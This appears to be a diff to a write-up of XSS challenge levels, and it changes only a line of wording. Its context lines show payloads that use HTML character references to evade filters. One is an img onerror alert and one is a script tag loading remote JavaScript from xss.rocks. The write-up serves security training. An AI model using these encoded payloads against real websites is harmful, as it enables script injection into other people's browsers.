@@ -84,7 +84,7 @@ https://xmass.compass-demo.com/level12
 ```
 <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
 ```
-alternatively one character reference would be enough
+alternatively one character reference is enough
 ```
 <img src="x" onerror="&#97;lert(1)">
 ```
@@ -97,7 +97,7 @@ https://xmass.compass-demo.com/level13
 ```
 <script src="&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#120;&#115;&#115;&period;&#114;&#111;&#99;&#107;&#115;&sol;&#120;&#115;&#115;&period;&#106;&#115;"></script>
 ```
-alternatively one character reference would be enough
+alternatively one character reference is enough
 ```
 <script src="h&#116;tps://xss.rocks/xss.js"></script>
 ```
